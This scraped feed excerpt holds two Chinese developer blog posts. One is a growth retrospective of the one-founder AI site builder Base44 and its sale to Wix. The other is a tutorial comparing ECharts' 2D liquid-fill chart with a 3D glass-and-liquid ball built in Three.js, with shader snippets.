p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上一期我分享了一人独角兽公司榜单：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FuP1JhBeFVwuOYnwosVSnfg" target="_blank" title="https://mp.weixin.qq.com/s/uP1JhBeFVwuOYnwosVSnfg" ref="nofollow noopener noreferrer">建议AI创业者都关注这个「一人独角兽」公司榜单</a></p>
<p>里面提到一个「真·1 人公司」半年搞到 8000 万美元的离谱事迹，它就是 base44.com</p>
<p>饼干哥哥把他<strong>从 0 到被收购的完整链路都搜刮出来，并整理到了一个 html 里</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd923bbba0b94100b2291f104156f6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=6RAHxRqmTkvrDPf53j039p4C7B8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32aca72c3c1d499a82ed4801d0626158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=BTfZLhccOqaXnT7gaVIFwqrQF8M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/128d5ed042894f8fb54bc8c9bd37601e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=z8paByNvvxNoV5aOV8rWJtR0sqk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49d9743339b94b74be60d21b340b734f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=%2F31P4p0ILauVNfsVnHxcmrJPec4%3D" alt="" loading="lazy"/></p>
<p>我把HTML文件 入口放到了<strong>文末</strong>。</p>
<p>建议先看完我对 Base44 的增长复盘。</p>
<p>2025年，只有一个创始人、零融资、半年上线就盈利、最终以8000万美金被 Wix 全资收购的 Base44，把极简创业和极致增长的样板推到了所有产品人和创业者面前。</p>
<p>base44是AI建站工具，但定位的是「非程序员」，<strong>往下看你就知道为什么它能在产品、营销等全方位胜过 lovable、Cursor等知名AI 编程工具。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a4a3fcde9cf4218ba6d5aa65b0d7840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=t93abbMqLMpsDpfh1q7TmeHBp1w%3D" alt="" loading="lazy"/></p>
<p>复盘下来，创始人做了 5个关键决策。</p>
<p><strong>Part 1 破局：从“公开构建”到AI赋能的极致精简</strong></p>
<p>Base44的创始人Maor Shlomo，并非什么背景显赫的连续创业者，他只是一位普通的工程师。</p>
<p><strong>关键决策一：Building in Public（公开构建）</strong></p>
<p>这个产品的起点是他女朋友抱怨开发一个网站很难，于是他就萌生了这个产品的想法。</p>
<p>但他并没有一开始就埋头苦干，而是先发了一条推特，向世界宣告我要搭建这个产品，并且以后我会把所有的开发过程都公开，邀请大家一起见证 base44 的成长。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/534fc7a25ac647a182fbf8b10997d4b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=INYZGbGpXlgQ9cS4gPrNKptoogQ%3D" alt="" loading="lazy"/></p>
<p>听着是不是很奇怪，程序员不去干活，跑去发推特干嘛？</p>
<p>其实这是目前最流行的一种开发模式，叫<strong>build in public</strong></p>
<p>它完全颠覆了以往传统企业对自己商机想法高度保密的方式，而是把开发和运营进程等信息公开，甚至连利润都发出来。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c260f1d610e449ba331a303a4f4f4dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=RU8UfZ15nWHXU1QsQuiNy%2BWSQlI%3D" alt="" loading="lazy"/></p>
<p>这样做的好处是能吸引很多围观群众，热度上来之后，能吸引懂行的网友帮他出主意，很多种子用户也因为看到了创始人极致真实的过程而转化为忠实粉丝。</p>
<p>同时还能为产品快速完成冷启动，而这些都是免费的。</p>
<p><strong>关键决策二：AI辅助开发，极致精简组织</strong></p>
<p>从2024年11月到12月，Maor始终坚持“单人独行”。他利用Claude等AI工具辅助开发，甚至做到“三个月没写过一行前端代码”。</p>
<p><strong>在产品早期，追求“快”是核心。</strong></p>
<p>AI作为“超级杠杆”，让Maor得以一人完成传统团队才能完成的工作量。这种极致的精简，保证了极快的迭代速度和极低的运营成本，让Base44能够灵活应对市场变化，并将精力聚焦在核心产品价值上。</p>
<p><strong>Part 2 飞轮：用户反馈驱动的极致迭代</strong></p>
<p>高频小步快跑，是 Base44 能维持极致用户粘性和口碑的最大护城河。</p>
<p><strong>关键决策三：真人可用性测试，快速验证迭代</strong></p>
<p>刚开始，Maor 找了3个朋友，几乎每天都让他们用产品，自己就坐在旁边观察，每天晚上修 bug、改体验。</p>
<p>哪怕产品有了10万+用户后，他仍然每两周拉二三十个用户到线下，现<strong>场做 focus group，“盯着别人用产品”，再收集反馈快速迭代。</strong></p>
<p>产品体验上的每一个细节，都极度重视。</p>
<p>有多夸张？比如有用户抱怨部署繁琐，他马上加上了内置域名购买和自动部署功能；又比如有人反映只能用 Google 登录不方便，第二周就上线了多种登录方式（邮箱、微软、Facebook 等）。</p>
<p><strong>关键决策四：解决核心痛点，提升“首屏价值”</strong></p>
<p>base44 所有的迭代都围绕这个核心：<strong>消除用户摩擦，让产品价值“即时可见”</strong>。</p>
<p>用Maor的话就是：“用户的耐心极其有限，首屏必须让人眼前一亮。”</p>
<p>原本 Base44 设计了详细的“流程引导”，后来他果断砍掉，用户一进来直接看到自动生成的完整 App。这个调整直接让新用户激活率飙升 3 倍。</p>
<p>这也成就了**Base44最大的差异点，是真正实现了“傻瓜式生成”：一句提示语，连数据库、认证、支付、AI集成这些复杂功能都自动搞定，**极大地降低了用户入门门槛，加速了用户转化和激活。</p>
<p><strong>Part 3 爆发：有机增长与精准渠道策略</strong></p>
<p>相比大多数互联网项目“融资-烧钱-广告-增长”的老套路，Base44 的增长打法堪称反向操作：<strong>完全不投广告、不请 KOL、甚至不买量</strong>。</p>
<p>Maor 试过一次 influencer 合作和 Meta 广告，结果ROI很低，随即放弃，聚焦**“有机增长”。**</p>
<p><strong>关键决策五：聚焦优势渠道，精准B2B起量</strong></p>
<p>在2025年6月复盘增长时，Maor明确指出，<strong>联盟分发和自然增长优于付费广告</strong>（尽管他持续试验Meta Ads，但并未重仓）。</p>
<p>2025年7月上旬，他更是<strong>All-in LinkedIn</strong>，将Twitter作为次要分发渠道。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2fc2e15e2d24fccaec2932c1eb84438~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=Il3XITqWXj%2FItdMHfBE02cOH4zE%3D" alt="" loading="lazy"/></p>
<p>因为创始人清楚自己的目标用户是“不会写代码的小企业主和创业者”，这些群体在LinkedIn上的活跃度更高。将有限的精力聚焦在用户最集中的平台，通过内容分享和个人品牌构建，实现精准触达和高效转化。</p>
<p><strong>这些“去中心化增长”的做法，让 Base44 在上线 7 周就突破了 14 万用户，半年后已超 40 万注册用户，</strong></p>
<p>除此之外，base44 也在<strong>拓展企业级服务：</strong> 2025年7月9日，Base44发布了<strong>Workspaces（团队工作区）</strong>，支持团队协作、集中支付、私有集成和自托管DB。这是面向B2B场景的关键一步，为企业采购奠定了基础，进一步加速了营收增长。</p>
<p><strong>Part 4: 高光：8000万美金收购与AI时代的超级个体神话</strong></p>
<p>2025年6月18日，互联网巨头Wix宣布以高达8000万美金现金（含Earn-out）全资收购Base44。</p>
<p>此时，Base44仍是一个极简团队，没有外部融资。</p>
<p>在被收购后，Maor不仅在X上发布长文详细复盘了“零融资、极简组织”成功突围的原因，还在知名播客Lenny's Podcast上分享了所有的增长秘诀、AI技术栈和作为单人创始人的取舍。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c956d6fe6dd478dbbcf95127f193602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=VYWszXuyb8OzSOFkJyVJy65mhuA%3D" alt="" loading="lazy"/></p>
<p>在收购后，Base44的业务仍在高速推进，2025年8月25日，创始人公布日ARR（年化经常性收入）已达40万美金，并在9月9日发布了<strong>Fast Mode（小于15秒建App）</strong>，将“首屏价值”的极致化体验推向新高度。</p>
<p>甚至烧了大量的钱在YouTube打广告，以至于我现在上 YouTube刷到的广告10个有8个可能就是 base44</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f045b301ed8f4d27a0e231395a5b6286~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aW85bmy5ZOl5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768707160&amp;x-signature=FgnS9QO9zDRw6wdNygMmitkY%2F64%3D" alt="" loading="lazy"/></p>
<p><strong>AI时代，人人皆有机会</strong></p>
<p>Base44的故事，不仅仅是一个关于赚钱速度的传奇，它更深远的意义在于：<strong>它代表了新一代AI工具，如何为“个人创始人”提供了前所未有的超级杠杆。</strong></p>
<p>不用依赖庞大团队、无需仰仗巨额风投，一个有洞察力、擅长利用AI工具、并敢于“公开构建”的个体，也能在AI时代撬动全球市场，实现快速变现，甚至打造出“单人独角兽”。</p>
<p>下一个Base44，说不定就是你。</p>
<p>这个时代，值得我们每个躬身入局者，去勇敢探索，去极致实践！</p>
<p>base44的完整时间线 html 我放到了公众号后台</p>
<p>关注公众号「饼干哥哥AGI」回复关键词「base44」即可</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法]]></title>    <link>https://juejin.cn/post/7594681318828343346</link>    <guid>https://juejin.cn/post/7594681318828343346</guid>    <pubDate>2026-01-13T14:03:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594681318828343346" data-draft-id="7594681318828326962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法"/> <meta itemprop="keywords" content="前端,Vue.js,数据可视化"/> <meta itemprop="datePublished" content="2026-01-13T14:03:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一颗烂土豆"/> <meta itemprop="url" content="https://juejin.cn/user/764915822371912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ECharts 水球图不够炫？试试 RayChart 的创意可视化玩法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/764915822371912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一颗烂土豆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T14:03:12.000Z" title="Tue Jan 13 2026 14:03:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    28
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">有趣的3D图表水球：从 ECharts 到 RayChart 的升维打击</h2>
<p>在数据可视化大屏中，“水球图”（Liquid Fill Chart）绝对是展示百分比数据（如CPU使用率、完成度、剩余电量）的颜值担当。</p>
<p>大家最熟悉的莫过于 ECharts 的 <code>echarts-liquidfill</code> 插件。它简单、好用，但在这个“卷”视觉的时代，传统的 2D 扁平水球有时显得不够“震撼”。</p>
<p>今天我们来聊聊一个有趣的话题：<strong>如何用 RayChart 手搓一个真实的 3D 水球，并对比它与 ECharts 水球的区别。</strong>
<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">raychart体验地址：https://chart3js.netlify.app</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4949ebd87201477ba27c8988f19fdf6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6aKX54OC5Zyf6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768958523&amp;x-signature=TJ2c4eKzxSRHIymfSymBV6ymNLc%3D" alt="格式工厂 屏幕录像20260113_214646 00_00_00-00_00_37 00_00_00-00_00_30.gif" loading="lazy"/></p>
<h3 data-id="heading-1">1. 传统的 2D 做法：ECharts LiquidFill</h3>
<p>ECharts 的水球本质上是 <strong>2D Canvas/SVG 绘图</strong>。</p>
<h4 data-id="heading-2">原理</h4>
<p>它的“波浪”并不是真的流体，而是通过数学公式（通常是正弦函数 <code>y = A * sin(Bx + C) + D</code>）在 2D 平面上绘制出的闭合路径。通过不断改变相位（Offset），让曲线平移，从而产生“波动”的视觉错觉。</p>
<h4 data-id="heading-3">特点</h4>
<ul>
<li><strong>优点</strong>：
<ul>
<li><strong>性能极佳</strong>：几乎不占用 GPU 资源。</li>
<li><strong>兼容性好</strong>：甚至可以在不支持 WebGL 的环境运行。</li>
<li><strong>配置简单</strong>：几行配置就能搞定。</li>
</ul>
</li>
<li><strong>缺点</strong>：
<ul>
<li><strong>扁平</strong>：没有厚度，没有光影。</li>
<li><strong>质感单一</strong>：虽然可以加渐变色，但无法表现出水的折射、玻璃的通透感。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">2. 进阶的 3D 做法：RayChart 硬核实现</h3>
<p>为了追求“透亮”、“像真水一样”的效果，我们必须引入 <strong>WebGL</strong> 和 <strong>PBR（基于物理的渲染）</strong>。</p>
<p>在我的开源项目 <code>RayChart</code> 中，我实现了一个 <code>Liquid3D</code> 组件。下面来看看它是如何“骗”过你的眼睛的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77a318afefe0493599a4f59c0397929c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6aKX54OC5Zyf6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768958523&amp;x-signature=yg88WTOtb83hP0UlY%2Fk74UnPU8U%3D" alt="ScreenShot_2026-01-13_215921_289.png" loading="lazy"/></p>
<h4 data-id="heading-5">核心构成</h4>
<p>一个真实的 3D 水球通常由三部分组成：</p>
<ol>
<li><strong>玻璃外壳</strong>：一个透明的球体容器。</li>
<li><strong>液体主体</strong>：球体内部被截断的下半部分。</li>
<li><strong>液体表面</strong>：一个随波浪起伏的顶盖。</li>
</ol>
<h4 data-id="heading-6">技术实现细节</h4>
<h5 data-id="heading-7">A. 玻璃外壳 (The Glass Shell)</h5>
<p>ECharts 很难做出的效果就是“玻璃感”。在 RayChart (基于 Three.js) 中，我们使用 <code>MeshPhysicalMaterial</code>，并开启 <code>transmission</code>（透光率）属性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> shellMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshPhysicalMaterial</span>({
    <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span>,
    <span class="hljs-attr">transmission</span>: <span class="hljs-number">0.9</span>, <span class="hljs-comment">// 90% 透光，像玻璃一样</span>
    <span class="hljs-attr">roughness</span>: <span class="hljs-number">0</span>,      <span class="hljs-comment">// 极其光滑</span>
    <span class="hljs-attr">ior</span>: <span class="hljs-number">1.5</span>,          <span class="hljs-comment">// 折射率，模拟玻璃/水晶</span>
    <span class="hljs-attr">thickness</span>: <span class="hljs-number">0.5</span>,    <span class="hljs-comment">// 厚度，产生真实的折射效果</span>
    <span class="hljs-attr">transparent</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<p>这让背景能够透过球体产生扭曲，质感瞬间拉满。</p>
<h5 data-id="heading-8">B. 液体主体：着色器里的“裁剪术”</h5>
<p>液体本身其实也是一个球体（<code>SphereGeometry</code>），但我们需要根据水位把它“切”开。</p>
<p>普通的 <code>clippingPlanes</code> 切出来是平的，没有波浪。所以我们需要写一点 Shader（着色器）。</p>
<p><strong>秘籍：</strong> 使用 <code>onBeforeCompile</code> 修改标准材质，在 Fragment Shader 中加入 <code>discard</code> 逻辑。</p>
<pre><code class="hljs language-glsl" lang="glsl">// GLSL 片段着色器伪代码
float h = getWaveHeight(vWorldPosition.x, vWorldPosition.z); // 计算波浪高度
// 如果当前像素的高度 &gt; 水位 + 波浪高度，就丢弃（不渲染）
if (vWorldPosition.y &gt; uLevelY + h) discard;
</code></pre>
<p>这样，原本完整的球体就被“切”出了一个起伏的边缘。</p>
<h5 data-id="heading-9">C. 液体表面：动态波浪</h5>
<p>被切掉的顶部不能空着，需要盖一个“盖子”。这个盖子是一个高密度的 <code>PlaneGeometry</code>。</p>
<p><strong>难点：</strong> 盖子的波动必须和球体的切口严丝合缝，否则会漏水。</p>
<p><strong>解决方案：</strong></p>
<ol>
<li><strong>几何同步</strong>：表面使用与主体完全相同的波浪公式（正弦波叠加）。</li>
<li><strong>圆形遮罩</strong>：因为 Plane 是方形的，我们需要在 Shader 里把超出球体半径的部分裁掉。</li>
</ol>
<pre><code class="hljs language-glsl" lang="glsl">// Vertex Shader: 让顶点随波浪起伏
vec3 pos = position;
float waveH = getWaveHeight(worldPos.x, worldPos.z);
pos.y += waveH; // 顶点置换

// Fragment Shader: 切成圆形
if (length(vUv - 0.5) * 2.0 &gt; 1.0) discard;
</code></pre>
<h3 data-id="heading-10">3. 终极对比：ECharts vs RayChart</h3>








































<table><thead><tr><th align="left">维度</th><th align="left">ECharts LiquidFill</th><th align="left">RayChart Liquid3D</th></tr></thead><tbody><tr><td align="left"><strong>渲染引擎</strong></td><td align="left">Canvas / SVG</td><td align="left">WebGL (Three.js)</td></tr><tr><td align="left"><strong>视觉维度</strong></td><td align="left">2D 平面</td><td align="left">3D 空间</td></tr><tr><td align="left"><strong>质感</strong></td><td align="left">色块、渐变、扁平阴影</td><td align="left"><strong>折射、反射、高光、环境光遮蔽</strong></td></tr><tr><td align="left"><strong>交互</strong></td><td align="left">鼠标悬浮高亮</td><td align="left">360度旋转、缩放、甚至可以晃动液体</td></tr><tr><td align="left"><strong>性能开销</strong></td><td align="left">⭐ (极低)</td><td align="left">⭐⭐⭐ (中高，依赖 GPU)</td></tr><tr><td align="left"><strong>适用场景</strong></td><td align="left">普通报表、H5 页面、移动端</td><td align="left"><strong>大屏可视化、数字孪生、高逼格演示</strong></td></tr></tbody></table>
<h3 data-id="heading-11">4. 总结</h3>
<ul>
<li>如果你需要一个<strong>快速加载、兼容性强</strong>的进度展示，<strong>ECharts</strong> 依然是首选。</li>
<li>如果你在做<strong>酷炫的数据大屏</strong>，想要那种“看起来很贵”的效果，<strong>RayChart</strong> 的 3D 水球绝对值得一试。</li>
</ul>
<p><strong>RayChart</strong> 项目正在探索更多这样的 3D 图表组件，希望能把 WebGL 的门槛降下来，让大家都能轻松用上“电影级”的图表。</p>
<hr/>
